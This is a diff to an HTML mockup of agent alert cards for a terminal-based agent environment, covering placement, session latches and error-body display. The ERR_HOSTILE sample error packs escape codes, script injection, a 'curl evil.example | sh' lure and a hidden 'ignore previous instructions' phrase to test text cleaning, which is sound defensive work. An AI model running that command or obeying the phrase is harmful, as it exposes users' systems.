@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>ADE alerts: today, restyle, follow-ups (mockup, draft 3)</title>
+<title>ADE alerts: today, restyle, follow-ups (mockup, draft 4)</title>
 <style>
 /* ------------------------------------------------------------------
    Page chrome (the mockup's own controls). Not ADE's look.
@@ -119,6 +119,9 @@ body[data-view="follow"] .banner { display: block; }
 .pane + .pane { border-left: 1px solid var(--border-strong); }
 .win.stack .panes { flex-direction: column; }
 .win.stack .pane + .pane { border-left: 0; border-top: 1px solid var(--border-strong); }
+/* TerminalPane.tsx 103-106: when a tab has several panes each has a 2 px top border in its colour (dimmed unless active), so its header, REC and find bar sit 2 px lower than in a single pane. */
+.win.split .pane, .win.split.stack .pane + .pane { border-top: 2px solid color-mix(in srgb, var(--accent) 25%, transparent); }
+.win.split .pane.active, .win.split.stack .pane.active { border-top-color: var(--accent); }
 .win.topfill .pane { justify-content: flex-start; }
 .win.topfill .old, .win:not(.topfill) .fresh { display: none; }
 /* TerminalPane.tsx 122-192: the pane header. top 4, left 8, right 8, z-index 10, pointer-events none; the folder path; and, in the active pane only, RecordingControls.tsx (pointer-events auto). */
@@ -326,7 +329,7 @@ body[data-view="follow"] .banner { display: block; }
 <body data-view="today">
 
 <aside class="ctl" aria-label="Mockup controls">
-  <h1>ADE alerts, draft 3</h1>
+  <h1>ADE alerts, draft 4</h1>
   <p>Mockup for <code>2026-11-18-alerts-ux.md</code>. Names are placeholders. Click a trigger, or press its key while typing in the stand-in terminal. An alert must never take the cursor.</p>
 
   <fieldset>
@@ -436,6 +439,7 @@ body[data-view="follow"] .banner { display: block; }
       <label><input type="radio" name="err" value="normal" checked> <span>Normal</span></label>
       <label><input type="radio" name="err" value="long"> <span>Long</span></label>
       <label><input type="radio" name="err" value="hostile"> <span>Long and hostile</span></label>
+      <label><input type="radio" name="err" value="huge"> <span>Very long <small>3,000 characters: shown whole, as today; the body scrolls</small></span></label>
     </div>
   </fieldset>
 
@@ -468,6 +472,7 @@ body[data-view="follow"] .banner { display: block; }
     <label><input type="checkbox" id="opt-tracked" checked> <span>Launched from ADE <small>picker, orchestrator or launch command. Unticked: started by hand</small></span></label>
     <div class="row">
       <button data-fire="simLaunch">Launch</button>
+      <button data-fire="simPicker">Agent picker: launch another agent in this pane</button>
       <button data-fire="simPrompt">Prompt sent</button>
       <button data-fire="simSilence">3 s of silence</button>
       <button data-fire="simPerm">Permission prompt</button>
@@ -486,6 +491,8 @@ body[data-view="follow"] .banner { display: block; }
       <button data-fire="case4">4. claude -p (ends at once)</button>
       <button data-fire="case5">5. Two panes: one needs you, the other ends its turn</button>
       <button data-fire="case6">6. Claude started by hand</button>
+      <button data-fire="case18">18. No Agent status: a second agent launched in the same pane</button>
+      <button data-fire="case19">19. Claude Code exits seconds after a carded stop, tracked session unspent</button>
       <button data-fire="caseQ">A BMAD question is up, then a turn ends in tab 2</button>
       <button data-fire="caseQS">A BMAD question is up, then Codex goes quiet</button>
     </div>
@@ -519,7 +526,7 @@ body[data-view="follow"] .banner { display: block; }
           <div class="pane active" id="pane1">
             <div class="phead"><span class="badge">1</span><span class="cwd" data-name="a pane header's folder path">~/code/shop</span><button type="button" tabindex="-1" class="rec" data-name="the pane header's REC button (starts or stops a recording)" title="Start Recording">REC</button></div>
             <div class="find" data-piece="find" data-name="the terminal find bar" id="find1" hidden><div>Search...</div><span>Aa</span><span>.*</span><span>↑</span><span>↓</span><span>×</span></div>
-            <div class="fresh" data-name="the first lines of a new terminal (the shell prompt and the newest output)"><div class="ln">dev@mac shop % claude</div><div class="ln"> </div><div class="ln"><u>✻</u> <b>Welcome to Claude Code</b>   /help for help, /status for your current setup</div><div class="ln">  cwd: /Users/dev/code/shop</div></div>
+            <div class="fresh" data-name="the first lines of a new terminal (the shell prompt and the newest output)"><div class="ln">dev@mac shop % claude</div><div class="ln"> </div><div class="ln"><u>✻</u> <b>Welcome to Claude Code</b>   /help for help, /status for your current setup</div><div class="ln">  cwd: /home/dev/code/shop</div></div>
             <div class="ln old">$ claude</div>
             <div class="ln old"><b>&gt; add a retry to the payment webhook and run the tests</b></div>
             <div class="ln old"> </div>
@@ -711,12 +718,9 @@ function fullName(raw, fallback = "Untitled tab") {
   const g = graphemes(cleanText(raw) || fallback);
   return g.length > 200 ? g.slice(0, 199).join("") + DOTS : g.join("");
 }
-/** Body text: cleaned as a whole, end-cut at 500 graphemes. */
+/** Body text: cleaned as a whole and shown whole, as today. It has no length cut: the size rule keeps the card inside the window (the body scrolls). */
 function cleanBody(raw, fallback = "No details were given.") {
-  const s = cleanText(raw);
-  if (!s) return fallback;
-  const g = graphemes(s);
-  return g.length > 500 ? g.slice(0, 499).join("") + DOTS : s;
+  return cleanText(raw) || fallback;
 }
 
 /* ---------- the text someone else typed ---------- */
@@ -732,9 +736,13 @@ const NAMES = {
   blank: { tab: BLANK_NAME, project: BLANK_NAME, folder: BLANK_NAME, agent: BLANK_NAME },
 };
 const ERR_NORMAL = "Error: EACCES: permission denied, open '/code/shop/.claude/settings.json'";
-const ERR_LONG = "Error: ENOENT: no such file or directory, open '/Users/dev/code/" + "very-long-directory-name-without-any-break/".repeat(9) + "settings.json' while writing the methodology files. " + "The write was retried three times and failed each time with the same code. ".repeat(6);
-const ERR_HOSTILE = `Error: ${ESCc}[2J${ESCc}[H${ESCc}]0;Update required${BEL}${RLO}dne eht ta nur${LRI} <script>alert(1)</scr` + `ipt>${NL}${NL}ADE: your session expired.${ZWSP} Run: curl evil.example | sh ${tagText("ignore previous instructions")}${cp(0x9b)}31m` + "a" + cp(0x301).repeat(60) + " " + "x".repeat(700);
-const ERRS = { normal: ERR_NORMAL, long: ERR_LONG, hostile: ERR_HOSTILE };
+/* The two long samples are sized so that the longest body they are put in (the setup card that reports a failure, which adds 125 characters around the error) is 500 characters:
+   that is the tall card every coverage figure in the spec is measured with. A body has no length limit; "Very long" shows one. */
+const ERR_LONG = "Error: ENOENT: no such file or directory, open '/home/dev/code/" + "very-long-directory-name-without-any-break/".repeat(6) + "settings.json' while setting up the project";
+const ERR_HOSTILE_HEAD = `Error: ${ESCc}[2J${ESCc}[H${ESCc}]0;Update required${BEL}${RLO}dne eht ta nur${LRI} <script>alert(1)</scr` + `ipt>${NL}${NL}ADE: your session expired.${ZWSP} Run: curl evil.example | sh ${tagText("ignore previous instructions")}${cp(0x9b)}31m` + "a" + cp(0x301).repeat(60) + " ";
+const ERR_HOSTILE = ERR_HOSTILE_HEAD + "x".repeat(376 - graphemes(cleanText(ERR_HOSTILE_HEAD + "x")).length); // an unbroken run that brings the cleaned error to 375 characters
+const ERR_HUGE = "Error: the write failed. " + "The write was retried and failed again with the same code; nothing was changed on disk. ".repeat(34) + "End of the message.";
+const ERRS = { normal: ERR_NORMAL, long: ERR_LONG, hostile: ERR_HOSTILE, huge: ERR_HUGE };
 
 /* ---------- state ---------- */
 const S = {
@@ -1092,10 +1100,10 @@ function clearAll() {
 const rel = (r, w) => ({ top: r.top - w.top, left: r.left - w.left, right: r.right - w.left, bottom: r.bottom - w.top, width: r.width, height: r.height });
 let roomNow = 0;
 const slotRoom = () => roomNow;
-/** AB is A where the tab in front is a terminal and B on every other tab kind. */
+/** AB is A where the terminal layout is drawn and B where another kind's view is drawn. It follows what is drawn, not tab.type: App.tsx 357-389 draws the terminal layout for any tab whose kind lacks its field (an editor tab with no file path, a browser tab with no URL). "Tab kind in front" here is the layout drawn. */
 const eff = () => { const p = S.place === "AB" ? (S.kind === "terminal" ? "A" : "B") : S.place; return p === "A" && FU("f13") && S.overlay !== "none" ? "B" : p; }; // F13 only: a top-right card uses B's place while an overlay is open
 const areaEl = () => (S.kind === "terminal" ? panes : S.kind === "editor" ? $(".editor") : $(`[data-kindview="${S.kind}"]`)); // the tab's content: under the strip and the notice bar
-/** The find bar is in the active pane (TerminalPane.tsx 193-201): each pane has its own. */
+/** Each pane has its own find bar (TerminalPane.tsx 193-201). This stand-in opens only the active pane's. */
 const visibleFind = () => (S.piece.find && S.kind === "terminal" ? (S.piece.split && S.piece.active2 ? $("#find2") : $("#find1")) : null);
 function place() {
   const wb = win.getBoundingClientRect(), w = { top: wb.top + win.clientTop, left: wb.left + win.clientLeft, width: win.clientWidth, height: win.clientHeight }; // the box the slot is laid out in
@@ -1116,11 +1124,13 @@ function place() {
     slot.style.right = (w.width - colRight + 12) + "px";
     slot.style.width = width + "px";
     if (P === "A") {
-      // A terminal tab: 28 px down, so the card starts under the pane header (4 px, then REC's 19 px, then 5 px). Other tab kinds have no pane header: 8 px.
-      let top = area.top + (S.kind === "terminal" ? 28 : 8);
-      // Any find bar the card's box would meet at its top keeps its place: the card starts 8 px under it. One lower down (a stacked split) is not avoided.
-      const f = visibleFind();
-      if (f) { const fr = rel(f.getBoundingClientRect(), w); if (fr.right > colRight - 12 - width && fr.left < colRight - 12 && fr.top <= top + 26 && fr.bottom + 8 > top) top = fr.bottom + 8; }
+      // The terminal layout: 28 px down, so the card starts under the pane header. The header is 4 px down and REC is 17 to 19 px tall, so REC ends 21 to 23 px down
+      // and the card starts 5 to 7 px under it; in a split the pane's 2 px top border puts REC at 23 to 25 px and the gap is 3 to 5 px. Other layouts have no pane header: 8 px.
+      const rest = area.top + (S.kind === "terminal" ? 28 : 8);
+      let top = rest;
+      // The find-bar rule (spec B2, R5a): the card starts 8 px under every open find bar that its box, at its resting place, would overlap and whose top is within 26 px of the card's resting top,
+      // whichever pane that find bar is in. So a find bar at the top of the panes is avoided, also across a divider; one lower down (the lower pane of a stacked split) is not.
+      for (const f of $$(".find", win).filter((n) => !n.hidden)) { const fr = rel(f.getBoundingClientRect(), w); if (fr.right > colRight - 12 - width && fr.left < colRight - 12 && fr.top <= rest + 26 && fr.bottom + 8 > rest) top = Math.max(top, fr.bottom + 8); }
       slot.style.top = top + "px";
       room = Math.min(c.bottom, w.height) - top - 12;
     } else {
@@ -1168,7 +1178,8 @@ function setHook(id, next) {
     else if (S.view === "today" && toast?.key === `agent-needs-you-${p.pty}`) log("Today: the toast stays up for the rest of its 15 s. Nothing takes it down.");
   }
   if (!FU("f1")) return;
-  // A new turn is seen to start: the pane may be alerted for again. A prompt straight after a finished turn is a new turn too.
+  // Rule 4, first three clauses. A new turn is seen to start: the pane may be alerted for again. A prompt straight after a finished turn is a new turn too.
+  // The state going to none (the agent exited, Agent status was turned off) does NOT clear the latch. The fourth clause is in startSession().
   if (next === "ready" || (next === "working" && prev !== "needsYou") || (next === "needsYou" && (prev === "finished" || prev === "waiting"))) p.latch = false;
   if (next === "working" || next === "needsYou") { if (FU("f2")) withdraw(`agent-stopped-${p.pty}`, "the agent is working again"); }
   if (next === "finished" && (prev === "working" || prev === "needsYou")) {
@@ -1184,7 +1195,7 @@ function stoppedFrom(id, source) {
   // S, the silence guess: exactly today's. It replaces whatever is on screen, a question or a needs-you card included.
   if (source === "silence") { p.latch = true; return show("quiet"); }
   if (inView(p)) { p.latch = true; return log("No card: the turn ended in the tab in view (rule 3)."); }
-  // Rule 5: the new card does not replace another pane's needs-you card (on screen for 15 s at most). Anything else, the question included, is replaced as by any alert today.
+  // Rule 5: the new card does not replace another pane's needs-you card. Anything else, the question included, is replaced as by any alert today. With F3 on, F3's rule decides instead.
   if (!FU("f3") && cards.some((c) => c.def.kind === "needs" && c.def.pane !== p)) { p.latch = true; return log("No card: another pane's needs-you card is on screen and the new card does not replace it (rule 5). This stop is not shown later."); }
   p.latch = true;
   withdraw(`agent-needs-you-${p.pty}`, "the same pane ended its turn");
@@ -1202,15 +1213,24 @@ function silence(id) {
   if (p.hook != null) return log("3 s of silence: Agent status is reporting for this pane, so no silence card. F1 leaves the OS notification as it is: see the line above.");
   stoppedFrom(id, "silence");
 }
+/** agentTrackerStore.startSession: what the agent picker, the orchestrator and agentLaunch call when they start an agent in a pane.
+    F1 rule 4, fourth clause: a tracked session starting in the pane clears the latch. It is the one "an agent was launched here" fact F1 uses. */
+function startSession(id) {
+  const p = PANES[id];
+  p.tracker = true;
+  p.latch = false;
+}
+/** A new agent process in the pane: the one before it has exited, so its Agent-status state is gone. This does not touch the latch; only startSession (a launch from ADE) and a turn start do. */
 function launch(id) {
   const p = PANES[id];
   if (p.dwell) clearTimeout(p.dwell);
-  Object.assign(p, { hook: null, tracker: id === "p2a" ? S.tracked : true, latch: false, dwell: null, attention: false });
+  Object.assign(p, { hook: null, tracker: false, dwell: null, attention: false });
+  if (id !== "p2a" || S.tracked) startSession(id);
   renderTabs();
   log(`Agent started in tab <b>${shown(tabById(p.tab).name)}</b>${p.tracker ? ", launched from ADE" : ", by hand"}.`);
   if (hooksLive(p, id)) setHook(id, "ready");
 }
-const ensure = (id) => { const p = PANES[id]; if (p.hook == null) { p.tracker = true; p.hook = "working"; } };
+const ensure = (id) => { const p = PANES[id]; if (p.hook == null) { startSession(id); p.hook = "working"; } };
 
 /* ================= triggers ================= */
 function show(name, arg) {
@@ -1226,13 +1246,14 @@ const FIRE = {
   needs3: () => { for (const id of ["p2a", "p3", "p4"]) { ensure(id); PANES[id].hook = "working"; setHook(id, "needsYou"); } },
   subNeeds: () => { ensure("p2s"); PANES.p2s.hook = "working"; setHook("p2s", "needsYou"); },
   answer: () => { const id = ["p2a", "p2s", "p2b"].find((k) => PANES[k].hook === "needsYou"); if (!id) return log("Tab 2 has no prompt open."); setHook(id, "working"); },
-  quiet: () => { PANES.p2a.tracker = true; silence("p2a"); },
-  quietTask: () => { S.task = true; PANES.p2a.tracker = true; silence("p2a"); S.task = false; },
+  quiet: () => { startSession("p2a"); silence("p2a"); },
+  quietTask: () => { S.task = true; startSession("p2a"); silence("p2a"); S.task = false; },
   caseQ: () => { show("question"); FIRE.case6(); },
   caseQS: () => { show("question"); FIRE.case2(); },
   burst: () => { FIRE.needs(); later(1000, () => show("notSent")); },
   clear: () => { clearAll(); log("Cleared."); },
   simLaunch: () => launch("p2a"),
+  simPicker: () => { startSession("p2a"); log("Agent picker: another agent was typed into tab 2's terminal, which was free. A tracked session starts there (startSession)."); },
   simPrompt: () => (hooksLive(PANES.p2a, "p2a") ? setHook("p2a", "working") : log("A prompt was sent. No hooks here, so ADE sees only output.")),
   simSilence: () => silence("p2a"),
   simPerm: () => (hooksLive(PANES.p2a, "p2a") ? setHook("p2a", "needsYou") : log("The agent shows a permission prompt. No hooks here, so ADE cannot know.")),
@@ -1240,7 +1261,7 @@ const FIRE = {
   simStop: () => (hooksLive(PANES.p2a, "p2a") ? setHook("p2a", "finished") : log("The turn ended. No hooks here, so ADE sees only the silence that follows.")),
   simEnd: () => setHook("p2a", null),
   simHooksOn: () => { S.src = "claudeOn"; $("#src").value = "claudeOn"; log("Agent status turned on for this project. Hooks fire from the next event on."); },
-  simCd: () => { log("The active terminal changed folder."); if (FU("f10")) withdraw("context-guard", "the active terminal left that folder"); else if (cards.some((c) => c.def.kind === "warning" && c.def.hint)) log("The context card stays, and its button would type into this terminal (see F10)."); },
+  simCd: () => { log("The active terminal changed folder."); withdraw("setup-question:/code/shop", "the active terminal left that project: the question is withdrawn, as today"); if (FU("f10")) withdraw("context-guard", "the active terminal left that folder"); else if (cards.some((c) => c.def.kind === "warning" && c.def.hint)) log("The context card stays, and its button would type into this terminal (see F10)."); },
   simGoto: () => gotoAlert(),
   case1: () => { setSrc("claudeOn", true); launch("p2a"); setHook("p2a", "working"); later(300, () => silence("p2a")); later(900, () => setHook("p2a", "finished")); },
   case2: () => { setSrc("codex", true); launch("p2a"); later(300, () => silence("p2a")); },
@@ -1248,6 +1269,11 @@ const FIRE = {
   case4: () => { setSrc("claudeOn", false); launch("p2a"); setHook("p2a", "working"); later(200, () => setHook("p2a", "finished")); later(500, () => setHook("p2a", null)); },
   case5: () => { ensure("p2a"); PANES.p2a.hook = "working"; setHook("p2a", "needsYou"); PANES.p2b.hook = "working"; later(400, () => setHook("p2b", "finished")); },
   case6: () => { setSrc("claudeOn", false); launch("p2a"); setHook("p2a", "working"); later(300, () => silence("p2a")); later(700, () => setHook("p2a", "finished")); },
+  // 18: no Agent status. Codex launched from ADE goes quiet; a second agent is then launched in the same pane from the agent picker and goes quiet too. One silence card per tracked session, as today.
+  case18: () => { setSrc("codex", true); launch("p2a"); later(300, () => silence("p2a")); later(1500, () => FIRE.simPicker()); later(1800, () => silence("p2a")); },
+  // 19: Claude Code launched from ADE, Agent status on. Its turn ends before any 3 s pause has spent the tracked session; the stop card shows after the 2 s dwell; Claude Code exits (state none);
+  //     the silence that follows finds an unspent tracked session in a pane that is no longer covered. The latch is still set, so there is no second card for that turn.
+  case19: () => { setSrc("claudeOn", true); launch("p2a"); setHook("p2a", "working"); later(200, () => setHook("p2a", "finished")); later(2700, () => setHook("p2a", null)); later(3200, () => silence("p2a")); },
 };
 for (const k of Object.keys(DEFS)) if (!FIRE[k] && k !== "stopped") FIRE[k] = () => show(k);
 function setSrc(v, tracked) { S.src = v; S.tracked = tracked; $("#src").value = v; $("#opt-tracked").checked = tracked; }
@@ -1288,8 +1314,8 @@ document.addEventListener("keydown", (e) => {
 });
 function setCaption() {
   const P = {
-    AB: "<b>AB, recommended: top right on a terminal tab, bottom right on every other tab kind.</b> On a terminal tab the card hangs 28 px under the top of the terminal area, under the pane header and its REC button, 12 px from the right edge of the content column. On an editor, browser, fleet, orchestrator or contracts tab it sits where B does, clear of that tab's top-right controls. It is never over a side panel. Switch the tab kind, the new-terminal state and what is open over the window to see what it costs.",
-    A: "<b>A, top right of the tab's content on every tab kind.</b> Terminal tab: 28 px under the top of the terminal area, so under the pane header and REC; it starts under a find bar it would meet. It covers the right end of the first rows on screen: old output in a full terminal, the prompt and newest output in a new or cleared one. Other tab kinds: 8 px down, over their top-right controls.",
+    AB: "<b>AB, recommended: top right on a terminal tab, bottom right on every other tab kind.</b> On a terminal tab the card hangs 28 px under the top of the terminal area, under the pane header and its REC button, 12 px from the right edge of the content column. On an editor, browser, fleet, orchestrator or contracts tab it sits where B does, clear of that tab's top-right controls. It is never over a side panel. A tab counts as a terminal tab when the terminal layout is what is drawn. Switch the tab kind, the new-terminal state and what is open over the window to see what it costs.",
+    A: "<b>A, top right of the tab's content on every tab kind.</b> Terminal tab: 28 px under the top of the terminal area, so under the pane header and REC; it starts 8 px under an open find bar its box would overlap at the top, whichever pane that find bar is in. It covers the right end of the first rows on screen: old output in a full terminal, the prompt and newest output in a new or cleared one. Other tab kinds: 8 px down, over their top-right controls.",
     B: "<b>B, bottom right of the tab's content on every tab kind.</b> 12 px above the bottom of the content column, 12 px from its right edge. Never over a side panel, the scratchpad or the shortcut bar. In a full terminal it covers the right end of the newest lines, of Claude Code's input box and of its status line; in a new or cleared terminal, empty rows.",
     C: "<b>C, where the toast is today.</b> Fixed to the window: 60 px up, 20 px in. Nothing moves. With a right panel open it sits on the panel, not the terminal; with the scratchpad open it sits on the scratchpad.",
   };
